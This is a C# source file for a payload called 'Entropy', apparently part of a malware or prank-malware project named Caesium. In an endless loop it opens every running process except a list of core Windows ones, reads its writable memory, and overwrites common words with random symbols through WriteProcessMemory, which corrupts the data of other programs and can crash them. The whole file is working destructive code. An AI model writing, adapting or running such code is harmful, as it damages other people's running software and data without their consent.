using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Caesium.Payloads;

public abstract unsafe partial class Entropy : IPayload
{
    // --- WIN32 IMPORTS ---
    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial IntPtr OpenProcess(uint processAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
        int processId);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize,
        out int lpNumberOfBytesRead);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize,
        out int lpNumberOfBytesWritten);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial nint VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MemoryBasicInformation lpBuffer,
        uint dwLength);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct MemoryBasicInformation
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public ushort PartitionId;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    private static readonly string[] CriticalIsotopes =
    [
        "lsass", "csrss", "wininit", "smss", "services", "Caesium", "winlogon", "svchost", "conhost", "cmd",
        "fontdrvhost", "sihost"
    ];

    public static void Execute()
    {
        var rnd = Random.Shared;
        var buffer = new byte[1024 * 1024];
        var wordsDictionary = LoadWordDictionary();
        Console.WriteLine($"[Entropy] Loaded {wordsDictionary.Count} words into dictionary.");

        while (true)
        {
            var processes = Process.GetProcesses();
            foreach (var victim in processes)
            {
                if (CriticalIsotopes.Any(name =>
                        victim.ProcessName.Contains(name, StringComparison.OrdinalIgnoreCase))) continue;
                
                var hProcess = OpenProcess(0x001F0FFF, false, victim.Id);
                if (hProcess == IntPtr.Zero) continue;

                var wordChanges = 0;
                
                nuint currentAddr = 0;
                while (VirtualQueryEx(hProcess, (IntPtr)currentAddr, out var mbi,
                           (uint)sizeof(MemoryBasicInformation)) != 0)
                {
                    if (mbi.State != 0x1000 || mbi.Protect != 0x04 || mbi.RegionSize.ToInt64() < 4)
                    {
                        currentAddr = (nuint)mbi.BaseAddress + (nuint)mbi.RegionSize;
                        continue;
                    }

                    var regionSize = (int)Math.Min(buffer.Length, mbi.RegionSize.ToInt64());
                    if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, regionSize, out _))
                    {
                        var modified = false;
                        var boundaries = "\0 \n\r.,!?"u8.ToArray();
                        for (var i = 0; i < regionSize; i++)
                            if (IsAlphaNumeric(buffer[i]) && (i == 0 || boundaries.Contains(buffer[i - 1])))
                            {
                                var wordLen = 0;
                                while (i + wordLen < regionSize && IsAlphaNumeric(buffer[i + wordLen]))
                                    wordLen++;

                                if (wordLen < 4) continue;

                                var word = Encoding.ASCII.GetString(buffer, i, wordLen);
                                if (wordsDictionary.Contains(word))
                                {
                                    for (var j = 0; j < wordLen; j++) buffer[i + j] = (byte)"?@#&†‡"[rnd.Next(6)];
                                    modified = true;
                                    wordChanges++;
                                }

                                i += wordLen;
                            }

                        if (modified) WriteProcessMemory(hProcess, mbi.BaseAddress, buffer, regionSize, out _);
                    }

                    currentAddr = (nuint)mbi.BaseAddress + (nuint)mbi.RegionSize;
                    if (currentAddr == 0 || (long)currentAddr > 0x7FFFFFFFFFFF) break;
                }
                
                Console.WriteLine($"[Entropy] Hit Process: {victim.ProcessName}. Number of replacements: {wordChanges}");

                CloseHandle(hProcess);
                Thread.Sleep(100); // Pulse through the system
            }
        }
    }

    private static HashSet<string> LoadWordDictionary()
    {
        var assembly = Assembly.GetExecutingAssembly();
        const string resourceName = "Caesium.words.txt";
        
        using var stream = assembly.GetManifestResourceStream(resourceName);
        using var reader = new StreamReader(stream!);
        return new HashSet<string>(
            reader.ReadToEnd().Split('\n', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries),
            StringComparer.OrdinalIgnoreCase // Makes the HashSet case-insensitive
        );
    }

    private static bool IsAlphaNumeric(byte b)
    {
        return b is >= 0x41 and <= 0x5A or >= 0x61 and <= 0x7A or >= 0x30 and <= 0x39;
    }
}